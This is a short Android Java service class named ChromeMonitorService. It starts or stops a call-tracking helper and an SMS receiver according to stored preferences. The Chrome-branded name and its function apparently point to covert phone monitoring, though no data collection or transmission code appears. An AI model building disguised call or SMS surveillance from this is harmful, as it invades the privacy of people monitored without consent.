package com.chromemonitor;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class ChromeMonitorService extends Service {
    private CallHelper callHelper;
    private SmsReceiver smsReceiver;
    private IntentFilter intentFilter = new IntentFilter("SmsMessage.intent.MAIN");
 
    public ChromeMonitorService() {
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        callHelper = new CallHelper(this);
        smsReceiver = new SmsReceiver();
        
        boolean call = this.getSharedPreferences("com.chromemonitor", Context.MODE_PRIVATE).getBoolean("call", true);
        boolean sms = this.getSharedPreferences("com.chromemonitor", Context.MODE_PRIVATE).getBoolean("sms", true);
        
        int res = super.onStartCommand(intent, flags, startId);
        
        if (call) {
        	callHelper.start();
        } else {
        	callHelper.stop();
        }
        
        if (sms) {
        	this.registerReceiver(smsReceiver, intentFilter);
        } else {
        	this.unregisterReceiver(smsReceiver);
        }
        return res;
    }
 
    @Override
    public void onDestroy() {
        super.onDestroy();
  
        callHelper.stop();
        this.unregisterReceiver(smsReceiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
   }
}